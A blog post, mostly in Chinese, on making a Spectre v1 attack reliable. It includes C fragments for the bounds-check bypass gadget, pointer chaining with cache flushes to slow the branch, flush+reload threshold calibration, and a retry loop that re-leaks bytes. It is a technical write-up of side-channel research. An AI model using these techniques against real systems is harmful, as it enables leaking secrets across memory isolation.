---
layout: post
title: Make spectre reliable
categories: [Microarchitecture vulnerability, Microarchitecture]
description: How to make spectre reliable
keywords: Microarchitecture
mermaid: false
sequence: false
flow: false
mathjax: false
mindmap: false
mindmap2: false
---

# Spectre
Spectre 本质是一种竞争, 大致情况如下:
我们首先进行一个 `if` 判断, 但是这次分支检测会很慢, `***index_p3` 变量不在cache中,
此时因为out of order execution, 处理器会优先执行下面的指令(前提是我们branch prediction需要被很好的训练).
但是随后处理器会检测到分支预测的结果出现错误, 原本这个分支不该进入, 那么处理器会回滚到之前的执行环境, 然而此时
我们已经用flush reload测信道得到了我们想要的数据.
```
/*
|if branch prediction; reorder buffer(pick a victim address)|
->
|reorder buffer micro code executing|
->
prediction incorrect 
->
flush the Icache and roll back
*/

	if (index < ***index_p3) // if(index < size>)
	{	
		pick = reloadbuffer[fake_buffer[index] << 12];
	}
```

# optimization

## chaining
最简单的办法就是, 我们将分支的执行速度变慢.
我们可以通过多重指针 (`***index_p3`)的方法, 访问 `size` 就需要不断的解析地址.


```
unsigned int *index_p1 = &size;
unsigned char aligned_buffer1[4096];
unsigned int **index_p2 = &index_p1;
unsigned char aligned_buffer2[4096];
unsigned int ***index_p3 = &index_p2;
```

同时我们将所有的指针的地址全部flush, 也就是说这个时候, 我们会遇到四次 cache miss, 我们也会有足够的时间访问我们需要访问的victim data.

```
cacheflush(&size);
			cacheflush(&index_p1);
			cacheflush(&index_p2);
			cacheflush(&index_p3);
			for(int z = 0; z < 100; z++){
			}

```

## Inline assembly
第二个方法就是改成汇编, 但是编译器产生的代码还是比较简洁的, 不一定能起到很好的效果.

## Threshold
最重要的一个就是阈值需要设置正确.

一开始我通过下面的代码生成阈值, 但是我得到的是大致 cache miss 的均值. 这个阈值明显偏高.

```
uint64_t measure_latency() {
	uint64_t time = 0;
	uint64_t time_total = 0;
	uint64_t threshold = 0;
	struct timespec start, end;
	for (int r = 0; r < 300; r++) {
		cacheflush(&fake_buffer[0]);
		barrier();
		time = timed_read(&fake_buffer[0], &start, &end);
		time_total += time;
	}
	threshold = time_total / 300;
	return threshold;
}
```

我们可以计算出 300 次cache miss最小的时间, 但是这个时间依然比cache hit时间要大不少.
所以最好同时测量cache miss 和 hit 的时间, 然后手动设置阈值.

## rolling back
有时候由于噪音的影响, 会出现很明显的错误, 例如我的例子中获得的结果不是可打印字符.

这时候我们可以通过回滚重新进行 spectre攻击.

```
for(int i = 0; i < secret_len; i++)
	{
		leak(offset + i, &byte);
		if(byte >= 0x20 && byte <= 0x7e)
			leaked[i] = byte;
		else{
			i = i - 1;
		}
		
	}
```

## improve iterations
加大测量的数目一定程度上可以优化 spectre, 尤其在噪音比较多的时候, 但是往往效果并不好.
在我的实验中, reload 过程中的 cache hit 几乎都是集中在某一个点上, 这时候增加测量次数往往不能起到任何作用.
